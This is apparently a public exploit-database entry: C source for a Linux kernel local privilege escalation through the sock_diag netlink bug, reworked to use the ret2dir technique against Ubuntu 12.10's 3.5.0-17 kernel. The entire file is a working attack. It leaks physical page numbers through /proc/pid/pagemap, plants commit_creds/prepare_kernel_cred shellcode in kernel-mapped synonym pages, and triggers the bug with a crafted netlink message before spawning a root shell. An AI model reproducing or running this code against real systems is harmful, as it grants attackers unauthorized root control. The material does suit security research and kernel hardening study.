/*
 * Modified to use the `ret2dir' technique (October 2013)
 * Vasileios P. Kemerlis <vpk@cs.columbia.edu>
 *
 * EDB-ID: 24746
 *
 * Tested on 3.5.0*, 3.5.0-pax (KERNEXEC only)
 *
 * NOTE(s):
 * 	- set `PAGE_OFFSET', `KERN_HIGH', `KERN_NX_START',
 * 		and `KERN_NX_END' accordingly
 */

#include <errno.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/netlink.h>
#include <sys/mman.h>
#include <sys/socket.h>

static unsigned long map_addr, map_addrs;

/* pagemap query result (see querypmap()) */
struct pmap_qres {
	unsigned long	btarget;	/* branch target 	*/
	size_t		pnum;		/* page number 		*/
};

#define PAGE_SIZE	4096
#define ALLOC_STEP	1024*1024*16	/* chunk of 16MB	*/
#define PATH_SZ		32		/* path size (/proc/<pid>/pagemap) */
#define PRESENT_MASK	(1ULL << 63) 	/* get bit 63 from a 64-bit integer */
#define PFN_MASK	((1ULL << 55) - 1)	/* get bits 0-54 from
						   a 64-bit integer */
#define PAGE_OFFSET	0xffff880000000000UL	/* kernel space */
#define	KERN_LOW	0xffff880001c00000UL	/* range start */
#define KERN_HIGH	0xffff880080000000UL	/* range end */
#define	KERN_NX_START	0xffff8800361ac000UL	/* NX range start */
#define	KERN_NX_END	KERN_HIGH		/* NX range end */

#define NETLINK_SOCK_DIAG	4
#define SOCK_DIAG_BY_FAMILY	20
#define UDIAG_SHOW_NAME		0x00000001
#define UDIAG_SHOW_PEER		0x00000004
#define UDIAG_SHOW_RQLEN	0x00000010

struct unix_diag_req {
	__u8	sdiag_family;
	__u8	sdiag_protocol;
	__u16	pad;
	__u32	udiag_states;
	__u32	udiag_ino;
	__u32	udiag_show;
	__u32	udiag_cookie[2];
};

/* 3.5.0-17-generic */
#define	SDIAG_FAMILY	0x2d
#define	MMAP_ADDR	0x1a000
#define	MMAP_OFFSET	0xd30
#define	COMMIT_CREDS	0xffffffff8107d180
#define PREP_KERN_CRED	0xffffffff8107d410
#define SHELL_PREFIX	8		/* 8 bytes of "prefix" code */
#define SHELL_SUFFIX	24		/* 24 bytes of "suffix" code */
#define	SHELL_ADV	3		/* 3 bytes of code advancement */
static char shell_tmpl[] =
		"\x55"			/* push	%rbp		*/
		"\x48\x89\xe5"		/* mov	%rsp, %rbp	*/
		"\x53"			/* push	%rbx		*/
		"\x48\xc7\xc3"		/* mov	$<kaddr>, %rbx	*/
		"\x48\xc7\xc0"		/* mov	$<kaddr>, %rax	*/
	"\x48\xc7\xc7\x00\x00\x00\x00"	/* mov	$0x0, %rdi	*/
		"\xff\xd0"		/* callq *%rax		*/
		"\x48\x89\xc7"		/* mov	%rax, %rdi	*/
		"\xff\xd3"		/* callq *%rbx		*/
	"\x48\xc7\xc0\x00\x00\x00\x00"	/* mov	$0x0, %rax	*/
		"\x5b"			/* pop	%rbx		*/
		"\xc9"			/* leaveq		*/
		"\xc3";			/* ret			*/

	
/*
 * query the pagemap
 *
 * open /proc/<pid>/pagemap and try to find the 1st page from a range of
 * user space pages that has a synonym inside [KERN_LOW, KERN_HIGH]
 * (i.e., in the direct-mapped RAM region in kernel space)
 *
 * @pid:	the pid of the process that we are interested into
 * @vaddr:	starting virtual address (page-aligned)
 * @psize:	page size
 * @pnum:	number of pages in the range
 * returns:	a `struct pmap_qres' (i.e., the kernel address of a vaddr,
 * 			or 0 if no vaddr is kernel-mapped/present, and the
 * 			page number for vaddr)
 */
static struct pmap_qres
querypmap(pid_t pid, unsigned long vaddr, long psize, size_t pnum)
{
	/* path in /proc 	*/
	char 			path[PATH_SZ];

	/* pagemap entries	*/
	uint64_t 		*pentry	= NULL;

	/* pagemap file		*/
	FILE 			*fp	= NULL;

	/* return value		*/
	struct pmap_qres 	rval	= {0, 0};

	/* helper */
	unsigned long 		kaddr	= 0;

	
	/* initialize the pagemap entries */
	if ((pentry = calloc(pnum, sizeof(uint64_t))) == NULL) {
		printf("[-] failed to allocate memory for pagemap "	\
				"entries (%s), aborting!\n",
				strerror(errno));
		exit(1);
	}

	/* cleanup */
	memset(path, 0, PATH_SZ);

	/* format the path variable */
	if (snprintf(path, PATH_SZ, "/proc/%d/pagemap", pid) >= PATH_SZ) {
		/* failed */
			printf("[-] failed to set the path for "	\
				"/proc/%d/pagemap (%s), aborting!\n",
				pid,
				path);
		exit(1);
	}
	
	/* open the pagemap file */
	if ((fp = fopen(path, "r")) == NULL) {
		/* failed */
		printf("[-] failed to open %s (%s), aborting!\n",
				path,
				strerror(errno));
		exit(1);
	}

	/* seek to the appropriate place */
	if (fseek(fp, (vaddr / psize) * sizeof(uint64_t), SEEK_CUR) == -1) {
		/* failed */
		printf("[-] failed to seek in pagemap (%s), aborting!\n",
				strerror(errno));
		exit(1);
	}

	/* read the corresponding pagemap entries */
	if (fread(pentry, sizeof(uint64_t), pnum, fp) < 0) {
		printf("[-] failed while reading "			\
				"pagemap entries (%s), aborting!\n",
			strerror(errno));
		exit(1);
	}
	
	/* iterate the pagemap entries */
	vaddr += ((pnum - 1) * psize);
	while (pnum > 0) {
		/* check the present bit */
		if ((pentry[pnum - 1] & PRESENT_MASK) == 0) {
			/* page not present or invalid PFN */
			printf("\r[*] %#lx is not present in low memory  ",
	                                         vaddr);

			/* proper accounting */
			kaddr	= 0;
			vaddr	-= psize;
			pnum--;
			
			/* continue with the next page */	
			continue;
		}

		/* get the kernel-mapped address of vaddr */
		kaddr = ((pentry[pnum - 1] & PFN_MASK) * psize)	+
			PAGE_OFFSET 				+
			(vaddr & (psize - 1));

		/* verbose */
		printf("\r[?] %#lx is kernel-mapped at %#lx",
				vaddr,
				kaddr);
		
		/* valid match ? */
		if (kaddr >= KERN_LOW && kaddr <= KERN_HIGH &&
			(kaddr < KERN_NX_START || kaddr > KERN_NX_END)) 
			/* yeah baby */
			break;

		/* proper accounting */
		kaddr	= 0;
		vaddr	-= psize;
		pnum--;
	}

	/* cleanup */
	fclose(fp);
	printf("\n");
	
	/* prepare the query result and return */
	rval.btarget	= kaddr;
	rval.pnum	= pnum - 1;
	return rval;
}

/*
 * 	i. we begin with acquiring memory pages in user space, progressively,
 * 		and check if their synonyms fall inside the direct-mapped RAM
 * 		region in kernel space (this is done via leaking the PFN of each
 * 		page via /proc/<pid>/pagemap)
 *
 * 	ii. upon finding a user page whose directly-mapped counterpart falls
 * 		inside a RW(X) region in kernel (e.g., say 0x7f77e5bf3000 is
 * 		directly-mapped at 0xffff880001c00000), we copy the respective
 * 		data structures to the user pages, thus making them available to
 * 		kernel space as well (via their synonym pages in the
 * 		direct-mapped region)
 */
static void
map_synonym(void)
{
	long	psize;				/* page size */
	struct 	pmap_qres res	= {0, 0};	/* kernel-level address of the
						tampered-with data structure */

	/* get the page size */
#if 0
	if ((psize = sysconf(_SC_PAGESIZE)) == -1) {
		/* failed */
		printf("[-] failed to get the page size, aborting!\n");
			exit(1);
	}
#else
	psize = PAGE_SIZE;
#endif

	/* allocate ALLOC_STEP bytes in user space */
	if ((map_addr = (unsigned long)mmap(NULL,
			ALLOC_STEP,
			PROT_READ | PROT_WRITE, 
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, 
			-1,
			0)) == (unsigned long)MAP_FAILED) {
		/* failed */
		printf("[-] failed to mmap memory (%s), aborting!\n",
				strerror(errno));
		exit(1);
	}

	/* see if user space is kernel-mapped */
	res = querypmap(getpid(),
			map_addr,
			psize,
			ALLOC_STEP / psize);
	
	/* bad luck; try again */
	while (res.btarget == 0) {
		/* allocate ALLOC_STEP bytes in user space */
		if ((map_addr = (unsigned long)mmap(NULL,
			ALLOC_STEP,
			PROT_READ | PROT_WRITE, 
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
			-1,
			0)) == (unsigned long)MAP_FAILED) {
			/* failed */
			printf("[-] failed to mmap memory (%s), aborting!\n",
				strerror(errno));
				exit(1);
			}
	
		/* see if user space is kernel-mapped */
		res = querypmap(getpid(),
				map_addr,
				psize,
				ALLOC_STEP / psize);
	}

	/* update the globals */
	map_addr += res.pnum * PAGE_SIZE;
	map_addrs = res.btarget;
	
	/* paranoid */
	if (mlock((void *)map_addr, PAGE_SIZE) == -1) {
		/* failed */
		printf("[-] failed to lock memory (%s), aborting!\n",
			strerror(errno));
		exit(1);
	}
}

int
main(int argc, char **argv) {
	int		fd;
	unsigned long	mmap_start, caddr, paddr;
	struct {
		struct nlmsghdr		nlh;
		struct unix_diag_req	r;
	} req;


	if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) < 0){
		printf("[-] can't create sock diag socket -- %s\n",
				strerror(errno));
		return EXIT_FAILURE;
	}

	/* try to get a synonym page */
	map_synonym();

	memset(&req, 0, sizeof(req));
	req.nlh.nlmsg_len	= sizeof(req);
	req.nlh.nlmsg_type	= SOCK_DIAG_BY_FAMILY;
	req.nlh.nlmsg_flags	= NLM_F_ROOT | NLM_F_MATCH | NLM_F_REQUEST;
	req.nlh.nlmsg_seq	= 123456;

	req.r.udiag_states	= -1;
	req.r.udiag_show	=	UDIAG_SHOW_NAME |
					UDIAG_SHOW_PEER |
					UDIAG_SHOW_RQLEN;
	
	/* ubuntu 12.10 x86_64; kernel version 3.5.0-17-generic */
	req.r.sdiag_family	= SDIAG_FAMILY;
	mmap_start		= MMAP_ADDR;
	caddr			= COMMIT_CREDS;
	paddr			= PREP_KERN_CRED;

	if (mmap(	(void *)mmap_start,
			PAGE_SIZE,
			PROT_READ |PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
			-1,
			0) == MAP_FAILED	) {
		printf("[-] mmap failed -- %s\n", strerror(errno));
		return EXIT_FAILURE;
	}

	/* 
	 * set the tampered-with function pointer to the
	 * kernel-resident address (synonym) of `map_addr'
	 */
	*(unsigned long *)(mmap_start + MMAP_OFFSET) = map_addrs;

	/* shellcode stitching */
	memcpy((char *)map_addr, shell_tmpl, SHELL_PREFIX);
		map_addr += SHELL_PREFIX;
	memcpy((char *)map_addr, &caddr, sizeof(unsigned));
       		map_addr += sizeof(unsigned);
	memcpy((char *)map_addr, &shell_tmpl[SHELL_PREFIX], SHELL_ADV);
		map_addr += SHELL_ADV;
	memcpy((char *)map_addr, &paddr, sizeof(unsigned));
		map_addr += sizeof(unsigned);
	memcpy((char *)map_addr, &shell_tmpl[SHELL_PREFIX + SHELL_ADV],
							SHELL_SUFFIX);	

	/* w00t */
	send(fd, &req, sizeof(req), 0);
	if (!getuid())
		system("/bin/sh");

	return EXIT_SUCCESS;
}
